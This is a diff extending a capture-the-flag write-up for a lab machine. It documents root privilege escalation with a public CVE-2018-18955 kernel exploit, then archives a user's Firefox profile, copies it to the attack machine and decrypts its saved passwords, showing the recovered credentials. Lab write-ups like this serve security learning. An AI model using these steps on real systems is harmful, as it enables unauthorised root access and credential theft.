@@ -142,7 +142,49 @@ we guess the potential parameters is "image_url". Let try to fuzz it.
 
 ### PRIVILEGE ESCALATION: ###
 
-+ we use tool "linpeas.sh" to scan PE vector
++ We use tool "linpeas.sh" to scan PE vector.
++ We see into the "Executing Linux Exploit Suggester", we found the the potential exploitation. That is the kernel exploit with CVE-2018-18955: subuid_shell.
++ Check again the kernel target:
 
+```bash
+beth@london:~$ uname -a
+Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
 
++ We are able to use CVE-2018-18955 to priv root user.
++ Link: "https://github.com/scheatkode/CVE-2018-18955"
++ We choose the exploit dbus.sh, download all files rootshell.c, subshell.c, subuidshell.c and exploit.dbus.sh after that we tranfer all into the target machine.
 
+![alt text](image-10.png)
+
+### FIND PASSWORD CHARLES: ###
+
++ Access /charles and list hidden directories
+
+![alt text](image-11.png)
+
++ We found the folder "firefox", we guess that can be the backup of browser Firefox so we can use tool to extract password from profiles of Mozilla.
++ Link: "https://github.com/unode/firefox_decrypt"
++ First we need to create file .tar from "firefox" because the size of firefox is too big to tranfer directly.
+
+```bash
+root@london:/home/charles/.mozilla# ls
+firefox
+root@london:/home/charles/.mozilla# tar -cf firefox.tar firefox/
+root@london:/home/charles/.mozilla# ls
+firefox  firefox.tar
+```
+
++ Now we can tranfer file by scp or use python server to download back to attack machine.
+
+```bash
+root@z-a:~/firefox_decrypt# python3 firefox_decrypt.py ~/Documents/CTFs/LondonBridge/firefox/8k3bf3zp.charles/
+2024-11-07 16:45:14,981 - WARNING - profile.ini not found in /home/zicco/Documents/CTFs/LondonBridge/firefox/8k3bf3zp.charles/
+2024-11-07 16:45:14,981 - WARNING - Continuing and assuming '/home/zicco/Documents/CTFs/LondonBridge/firefox/8k3bf3zp.charles/' is a profile location
+
+Website:   https://www.buckinghampalace.com
+Username: 'Charles'
+Password: 'thekingofengland'
+```
+
+DONE!!!
